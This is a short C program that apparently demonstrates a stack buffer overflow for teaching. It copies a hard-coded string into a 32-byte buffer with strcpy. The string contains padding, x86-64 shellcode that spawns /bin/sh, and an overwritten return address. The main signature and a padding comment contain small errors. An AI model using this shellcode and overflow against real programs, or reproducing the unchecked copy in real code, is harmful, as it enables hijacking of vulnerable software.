#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

int main(char* argv[], int argc) {
        // In a normal situation we would have out string taken as input, to make things easier to demo, we have our string inside the program ready to go      
        // char rand_str[32];
        // gets(rand_str);

        //our malicious input will look something like this, containing 27 bad chars, so we need 5 padding chars minus one for the null terminator.
        char rand_str[] = "aaaa"
                          "\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
                          "\x30\xe3\xff\xff\xff\x7f";

        char buff[32];
        strcpy(buff, rand_str);
        printf("%s\n", buff);
        return 0;
}